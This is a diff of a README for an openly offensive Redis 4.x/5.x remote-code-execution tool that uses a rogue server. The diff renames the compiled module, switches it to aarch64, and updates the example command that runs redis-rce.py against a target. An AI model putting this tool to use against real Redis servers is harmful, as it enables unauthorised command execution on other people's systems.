@@ -5,7 +5,8 @@ A exploit for Redis 4.x/5.x RCE, inspired by [Redis post-exploitation](https://2
 This repo is a modified version of <https://github.com/n0b0dyCN/redis-rogue-server> .
 ## Usage:
 
-Compile exp.so from <https://github.com/RicterZ/RedisModules-ExecuteCommand>.
+Compile module.so from <https://github.com/RicterZ/RedisModules-ExecuteCommand>.
+And changed the architecture from x86 to aarch64
 
 
 ```
@@ -31,7 +32,7 @@ optional arguments:
 
 ## example:
 ```
-python redis-rce.py -r 127.0.0.1 -L 127.0.0.1 -f exp.so
+python redis-rce.py -r 127.0.0.1 -L 127.0.0.1 -f module.so
 ```
 
 ![](https://blogpics-1251691280.file.myqcloud.com/imgs/20190708220258.png)
